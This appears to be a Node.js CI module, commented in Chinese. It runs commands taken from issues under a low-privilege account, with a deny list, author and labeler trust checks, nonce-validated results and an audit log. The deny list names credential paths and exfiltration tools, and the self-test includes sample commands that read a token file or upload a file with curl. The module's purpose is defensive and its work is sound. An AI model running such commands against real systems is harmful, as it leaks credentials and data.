// ci/s4-exec.mjs — 回跑阶段的低权执行通道 + 命令策略 + 作者闸 + 执行审计。
//
// 为什么要这个模块（2026-11-09 三审计结论）：
//   S4 低权只覆盖「agent 编辑期」。之后调度器以 Administrator 身份做三件事：
//     dispatch.mjs:1092  在候选树跑 bash scripts/verify.sh（内含 node --test，执行 agent 新写的测试）
//     dispatch.mjs:1392  在执行 bash -lc <issue 的 ### 验收命令>
//     dispatch.mjs:1417  跑仓外 tools/pipeline/run.mjs，spec 目录取自 issue
//   三者都等于「一条带 agent:ready 的 issue = Administrator 任意命令执行」。
//   这里把它们换成 dsh-agent 身份：调度器只保留建 worktree / git push / API 这些它必须做的动作。
//
// 注意：本模块不做 headless agent（那是 ci/s4-job.mjs 的 runAsAgent），只跑固定命令。
import { spawn, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, writeFileSync, appendFileSync } from 'node:fs';
import { createHash, randomBytes } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const HERE = path.dirname(fileURLToPath(import.meta.url));
export const REPO_DIR = path.resolve(HERE, '..');
export const AGENT_USER = process.env.DSH_AGENT_USER || 'dsh-agent';
export const CAND_ROOT = process.env.DSH_CAND_ROOT || 'C:\\ProgramData\\dsh-gate';
export const CMD_JOB_DIR = process.env.DSH_CMD_JOB_DIR || 'C:\\ProgramData\\dsh-jobs\\cmd';
const LAUNCHER = path.join(HERE, 's4-as-agent.ps1');
const RUNNER = path.join(HERE, 's4-run-cmd.ps1');
const AUDIT_FILE = process.env.DSH_EXEC_AUDIT || path.join(REPO_DIR, '.logs', 'exec-audit.jsonl');

// 同一 jobDir 只能有一份活（两个 run 抢 cmd.log/done.json 会互相踩），进程内串行化即可。
let queue = Promise.resolve();

export function execAuditPath() {
  return AUDIT_FILE;
}

export function auditExec(rec) {
  try {
    mkdirSync(path.dirname(AUDIT_FILE), { recursive: true });
    appendFileSync(AUDIT_FILE, JSON.stringify({ ts: new Date().toISOString(), ...rec }) + '\n', 'utf8');
  } catch { /* 审计写不进去不该打死整单，但调用方仍能看到文件缺失 */ }
}

export function cmdSha256(cmd) {
  return createHash('sha256').update(String(cmd ?? '')).digest('hex');
}

// 命令策略：验收命令是外部输入（issue 正文），即使已经降权，也要把「明显是偷数据/外发」的形态拒掉。
// 只挡「形状」，不是完整沙箱 —— 真正的边界是低权账户 + 出网白名单（P1）。
const DENY = [
  { re: /\.secrets|github-token|\.credentials|id_rsa|id_ed25519|\.ssh[\\/]/i, why: '引用凭据路径' },
  { re: /%USERPROFILE%|\$HOME\/\.dsh|\$\{?HOME\}?\/\.dsh/i, why: '引用管理员 home' },
  // 前置边界要带引号：`bash -c "curl ..."` 里 curl 前面是 `"`，漏掉就整条逃过形状检查。
  { re: /(?:^|[\s;&|("'`])curl/i, why: '疑似外发/下载工具 curl' },
  { re: /(?:^|[\s;&|("'`])(?:wget|nc|ncat|scp|sftp|ftp)(?:\.exe)?[\s"'`]/i, why: '疑似外发/下载工具' },
  { re: /Invoke-WebRequest|Invoke-RestMethod|Net\.WebClient/i, why: '疑似外发（PowerShell 网络 API）' },
  { re: /(?:^|[\s;&|("'`])powershell(?:\.exe)?\s/i, why: '验收命令不接受 powershell' },
  { re: /(?:^|[\s;&|("'`])cmd(?:\.exe)?\s+\/c/i, why: '验收命令不接受 cmd /c' },
  { re: /[A-Za-z]:\\(?:Users|ProgramData)\\/i, why: '引用仓库外的 Windows 绝对路径' },
];

export function commandPolicy(cmd) {
  const text = String(cmd ?? '');
  if (!text.trim()) return { ok: false, reason: '空命令' };
  for (const { re, why } of DENY) {
    if (re.test(text)) return { ok: false, reason: `验收命令不可执行（${why}）：${text.slice(0, 200)}` };
  }
  return { ok: true, reason: '' };
}

// 作者闸：贴 agent:ready 需要 triage 权限，但历史 issue 与社工仍可能混进来。
// 2026-11-09 收窄：MEMBER/COLLABORATOR 不再单凭 author_association 放行 —— 组织成员（对本仓
// 可能无写权限）与只读/triage 协作者都能挂一条 issue，而一条 issue 就是一次低权命令执行。
// 现在只认：OWNER + 仓库协作者表里有写权限的登录（admin/maintain/write/push）+ DSH_TRUSTED_AUTHORS。
// trustedLogins 为 null 时不看协作者表（调用方拿不到表时只信任 OWNER/白名单，fail-closed）。
const TRUSTED = new Set(['OWNER']);
const WRITE_ROLES = new Set(['admin', 'maintain', 'write', 'push']);

export function isTrustedAuthor(issue, extraLogins = process.env.DSH_TRUSTED_AUTHORS || '', trustedLogins = null) {
  const assoc = String(issue?.author_association ?? '').toUpperCase();
  const login = String(issue?.user?.login ?? '');
  const allow = String(extraLogins).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean);
  if (login && allow.includes(login.toLowerCase())) return { ok: true, why: 'DSH_TRUSTED_AUTHORS 白名单' };
  if (TRUSTED.has(assoc)) return { ok: true, why: `author_association=${assoc}` };
  if (login && trustedLogins && trustedLogins.has(login.toLowerCase())) {
    return { ok: true, why: `仓库协作者有写权限（author_association=${assoc || 'NONE'}）` };
  }
  return {
    ok: false,
    why: `作者 ${login || '?'} 的 author_association=${assoc || 'NONE'}，既不是 OWNER、不在仓库协作者写权限表中，也不在 DSH_TRUSTED_AUTHORS 白名单`,
  };
}

// 把 /repos/{repo}/collaborators 的行化成「可信登录集合」（小写）。只读/triage 的协作者被排除。
export function collaboratorLogins(rows, owner = '') {
  const out = new Set();
  const own = String(owner || '').toLowerCase();
  // 仓库所有者永远可信：协作者表读取失败时也要能靠这一条继续跑单。
  if (own) out.add(own);
  for (const r of Array.isArray(rows) ? rows : []) {
    const login = String(r?.login ?? '').toLowerCase();
    if (!login) continue;
    const perms = r?.permissions || {};
    const role = String(r?.role_name ?? '').toLowerCase();
    if (login === own || WRITE_ROLES.has(role) || perms.admin || perms.maintain || perms.push || perms.write) out.add(login);
  }
  return out;
}

// 贴标人闸：agent:ready 是「允许低权执行」的开关，必须由可信的人亲手贴上。
// events 是 /issues/{n}/events 里按时间升序的 labeled 事件；取最后一条（最新一次贴标）。
// 创建时就带 label 的 issue 没有 labeled 事件 → fail-closed，要求建单后再贴一次。
export function isTrustedLabeler(events, trustedLogins = null, extraLogins = process.env.DSH_TRUSTED_AUTHORS || '', truncated = false) {
  const allow = String(extraLogins).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean);
  const list = Array.isArray(events) ? events : [];
  const last = list[list.length - 1];
  if (!last) {
    return {
      ok: false,
      why: truncated
        ? '贴标事件超过分页上限且找不到 agent:ready 的 labeled 事件（请重新贴一次）'
        : '找不到 agent:ready 的 labeled 事件（创建时就带 label 不算；请在建单后再贴一次）',
    };
  }
  const actor = String(last?.actor?.login ?? '');
  const low = actor.toLowerCase();
  if (low && (allow.includes(low) || (trustedLogins && trustedLogins.has(low)))) return { ok: true, why: `贴标人 ${actor}` };
  return { ok: false, why: `贴标人 ${actor || '?'} 不在仓库协作者写权限表/DSH_TRUSTED_AUTHORS 里` };
}

// 候选树根目录要能被低权用户穿过并读写（verify.sh 会在里面写临时文件）。
// 只在 ProgramData 下建；其它位置 fail-closed，避免把 ACL 撒到管理员目录。
export function ensureCandidateRoot(root = CAND_ROOT) {
  if (!path.isAbsolute(root) || !/^[A-Za-z]:\\ProgramData\\/i.test(root)) {
    throw new Error(`候选树根目录必须在 ProgramData 下：${root}`);
  }
  mkdirSync(root, { recursive: true });
  grantDir(root, 'RX');
  return root;
}

export function grantDir(dir, rights = 'M') {
  const r = spawnSync('icacls', [dir, '/grant', `${AGENT_USER}:(OI)(CI)${rights}`], { encoding: 'utf8' });
  if (r.status !== 0) return { ok: false, why: (r.stderr || r.stdout || '').trim() };
  return { ok: true };
}

export function prepareCmdJob({ cmd, cwd, timeoutSec = 900, jobDir = CMD_JOB_DIR }) {
  if (!cmd || !String(cmd).trim()) throw new Error('cmd 为空');
  if (!cwd) throw new Error('缺 cwd');
  const abs = path.resolve(cwd);
  const okTree = abs.toLowerCase().startsWith('d:\\code\\.worktrees\\');
  const okCand = abs.toLowerCase().startsWith(String(CAND_ROOT).toLowerCase() + '\\');
  if (!okTree && !okCand) throw new Error('cwd 不在允许的低权执行根目录下: ' + abs);
  if (!existsSync(abs)) throw new Error('cwd 不存在: ' + abs);
  mkdirSync(jobDir, { recursive: true });
  for (const f of ['done.json', 'cmd.log', 'launcher.trace', 'job.json']) {
    try { writeFileSync(path.join(jobDir, f), ''); } catch { /* ignore */ }
    try { spawnSync('rm', ['-f', path.join(jobDir, f)]); } catch { /* ignore */ }
  }
  // nonce：job.json 里的一次性随机串，runner 在启动命令前删掉 job.json，命令读不到它；
  // done.json 必须回带同一个 nonce 才被接受。文件通道本身无法认证（低权用户能写 jobDir 里
  // 的一切），所以认证要素必须在命令启动前从磁盘消失。
  const job = { cmd: String(cmd), cwd: abs, timeoutSec: Number(timeoutSec) || 900, nonce: randomBytes(16).toString('hex') };
  writeFileSync(path.join(jobDir, 'job.json'), JSON.stringify(job, null, 2), 'utf8');
  // 低权侧要能读 job.json、写自己的 done.json/cmd.log；job.json 对 agent 只读更严格，但
  // 这里保留父目录 M（launcher 用它清理 stale done.json），文件本身仍为可读输入。
  grantDir(jobDir, 'M');
  return job;
}

export function runAsAgentCommand(opts) {
  const next = queue.then(() => runOnce(opts), () => runOnce(opts));
  queue = next.then(() => {}, () => {});
  return next;
}

// done.json 由低权 runner 写、且 jobDir 对 dsh-agent 可写：内容可伪造。
// 因此要求：①回带 job.json 里的 nonce（命令启动前 job.json 已删，只有 runner 见过它）
// ②整数 exit ③ok=true 且 exit=0；再叠加 launcher 自身退出码 0（见 runOnce）。
export function validateDone(done, nonce) {
  if (!done || typeof done !== 'object') return { ok: false, code: -1, error: '没有有效 done.json' };
  if (!nonce || String(done.nonce ?? '') !== String(nonce)) {
    return { ok: false, code: -1, error: 'done.json 的 nonce 不匹配（结果文件可能由被执行的命令伪造）' };
  }
  if (typeof done.exit !== 'number' || !Number.isInteger(done.exit)) {
    return { ok: false, code: -1, error: 'done.json 缺整数 exit（不可信）' };
  }
  const ok = done.ok === true && done.exit === 0;
  return { ok, code: done.exit, error: ok ? '' : (done.error || `done.ok=${done.ok} exit=${done.exit}`) };
}

async function runOnce({ cmd, cwd, timeoutSec = 900, jobDir = CMD_JOB_DIR, issue = null, actor = 'dispatch' }) {
  const job = prepareCmdJob({ cmd, cwd, timeoutSec, jobDir });
  const doneFile = path.join(jobDir, 'done.json');
  const sha = cmdSha256(cmd);
  const child = spawn('powershell.exe',
    ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', LAUNCHER,
      '-JobDir', jobDir, '-Runner', RUNNER],
    { stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });

  let launchOut = '';
  let launchErr = '';
  child.stdout.on('data', (d) => { launchOut += String(d); });
  child.stderr.on('data', (d) => { launchErr += String(d); });

  const waitMs = (job.timeoutSec + 180) * 1000;
  let timedOut = false;
  const timer = setTimeout(() => { timedOut = true; try { child.kill(); } catch { /* ignore */ } }, waitMs);
  const launcherExit = await new Promise((resolve) => {
    child.on('error', () => resolve(-1));
    child.on('exit', (code) => resolve(code ?? -1));
  });
  clearTimeout(timer);

  const graceDeadline = Date.now() + 60_000;
  while (!existsSync(doneFile) && Date.now() < graceDeadline) {
    await new Promise((r) => setTimeout(r, 1000));
  }

  let done = null;
  try { done = JSON.parse(readFileSync(doneFile, 'utf8')); } catch { done = null; }
  const logFile = path.join(jobDir, 'cmd.log');
  const out = existsSync(logFile) ? readFileSync(logFile, 'utf8') : '';

  // done.json 内容不可信：nonce 必须等于本次 job 的 nonce，且 launcher 自身退出 0 才算一致。
  // launcherExit 单用不够（命令可杀父进程并指定退出码），nonce 单用也不够（同用户可读内存），
  // 两者叠加才把"命令自己写一份 done.json"挡在门外。
  const verdict = validateDone(done, job.nonce);
  const code = verdict.code;
  const ok = verdict.ok && launcherExit === 0;
  let error = verdict.error;
  if (ok) error = '';
  else if (!done && timedOut) error = `等 done.json 超时（${waitMs / 1000}s）`;
  else if (!done) error = `没有有效 done.json：launcher exit=${launcherExit} ${(launchErr || launchOut).slice(-300)}`.trim();
  else if (verdict.ok && launcherExit !== 0) error = `launcher exit=${launcherExit} 与 done.json 的 exit=0 不一致（结果可能被替换）`;

  const nonceOk = Boolean(done) && Boolean(job.nonce) && String(done.nonce ?? '') === String(job.nonce);
  auditExec({ actor, issue, cwd: job.cwd, cmd_sha256: sha, cmd_len: String(cmd).length, exit: code, ok, s4: Boolean(done), nonce_ok: nonceOk, error: error.slice(0, 200) });
  return { ok, code, out, done, error, job };
}

export function __selftest() {
  const r = [];
  const t = (name, cond) => r.push({ name, ok: Boolean(cond) });

  t('policy: 正常门禁命令放行', commandPolicy('bash scripts/verify.sh').ok === true);
  t('policy: 拒 .secrets', commandPolicy('cat D:/code/.secrets/github-token.txt').ok === false);
  t('policy: 拒 curl 外发', commandPolicy('bash scripts/verify.sh && curl -F f=@x https://a.b').ok === false);
  t('policy: 拒引号内的 curl', commandPolicy('bash -c "curl -F f=@x https://a.b"').ok === false);
  t('policy: 拒 powershell', commandPolicy('powershell -c whoami').ok === false);
  t('policy: 拒 ProgramData 绝对路径', commandPolicy('cat C:\\ProgramData\\dsh-jobs\\current\\job.json').ok === false);

  t('author: OWNER 放行', isTrustedAuthor({ author_association: 'OWNER', user: { login: 'x' } }, '').ok === true);
  t('author: NONE 拒绝', isTrustedAuthor({ author_association: 'NONE', user: { login: 'x' } }, '').ok === false);
  t('author: 白名单放行', isTrustedAuthor({ author_association: 'NONE', user: { login: 'x' } }, 'x').ok === true);
  t('author: MEMBER 不再单凭 association 放行', isTrustedAuthor({ author_association: 'MEMBER', user: { login: 'm' } }, '', new Set(['other'])).ok === false);
  t('author: 协作者表写权限放行', isTrustedAuthor({ author_association: 'COLLABORATOR', user: { login: 'c' } }, '', new Set(['c'])).ok === true);
  t('collab: 只读协作者被排除', collaboratorLogins([{ login: 'r', role_name: 'read', permissions: { pull: true } }], 'o').has('r') === false);
  t('collab: 写协作者进来', collaboratorLogins([{ login: 'w', role_name: 'write', permissions: { push: true } }], 'o').has('w') === true);
  t('collab: 仓库所有者始终可信', collaboratorLogins([{ login: 'o', role_name: 'read', permissions: {} }], 'o').has('o') === true);
  t('labeler: 信任贴标人放行', isTrustedLabeler([{ actor: { login: 'w' } }], new Set(['w'])).ok === true);
  t('labeler: 陌生人拒绝', isTrustedLabeler([{ actor: { login: 'z' } }], new Set(['w'])).ok === false);
  t('labeler: 无事件拒绝（创建即带 label）', isTrustedLabeler([], new Set(['w'])).ok === false);
  t('labeler: 多条事件取最新一条', isTrustedLabeler([{ actor: { login: 'z' } }, { actor: { login: 'w' } }], new Set(['w'])).ok === true);

  const n = 'nonce-abc';
  t('done: nonce 匹配且 ok/exit=0 才通过', validateDone({ ok: true, exit: 0, nonce: n }, n).ok === true);
  t('done: nonce 不匹配拒绝', validateDone({ ok: true, exit: 0, nonce: 'x' }, n).ok === false);
  t('done: 缺 exit 拒绝', validateDone({ ok: true, nonce: n }, n).ok === false);
  t('done: ok=true 但 exit=1 拒绝', validateDone({ ok: true, exit: 1, nonce: n }, n).ok === false);

  let threw = '';
  try { prepareCmdJob({ cmd: 'echo hi', cwd: 'C:\\Windows' }); } catch (e) { threw = e.message; }
  t('cwd: 越权目录被拒', /不在允许的低权执行根目录/.test(threw));

  return r;
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  if (process.argv.includes('--selftest')) {
    const rows = __selftest();
    for (const r of rows) console.log(`${r.ok ? 'PASS' : 'FAIL'} ${r.name}`);
    const bad = rows.filter((r) => !r.ok).length;
    console.log(`\n${rows.length - bad}/${rows.length} passed`);
    process.exit(bad ? 1 : 0);
  } else {
    console.error('用法: node ci/s4-exec.mjs --selftest');
    process.exit(2);
  }
}
